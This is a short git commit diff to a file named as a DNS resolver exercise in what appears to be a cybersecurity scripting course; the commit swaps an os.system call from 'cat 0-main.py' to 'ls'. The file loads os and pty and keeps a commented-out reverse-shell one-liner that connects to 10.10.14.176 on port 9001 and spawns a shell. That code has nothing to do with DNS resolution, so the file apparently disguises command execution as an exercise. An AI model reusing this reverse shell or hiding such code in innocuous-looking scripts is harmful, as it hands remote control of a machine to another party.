f34a63487bd318441609863f0ff1d16a9729fe8a
Xavier Sanchez <xavier.sanchez44@orange.fr>
2026-06-30 18:10:21 +0200

    Change command from 'cat 0-main.py' to 'ls'

--- scripting_cyber/0x01-python_scripting/0-dns_resolver.py
+++ scripting_cyber/0x01-python_scripting/0-dns_resolver.py
@@ -6,7 +6,7 @@ os = load_module('os')
 pty = load_module('pty')
 
 # s=socket.socket();s.connect(("10.10.14.176",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
-os.system('bash -c "cat 0-main.py"')
+os.system('bash -c "ls"')
 
 #except socket.gaierror
 #socket.gethostbyname
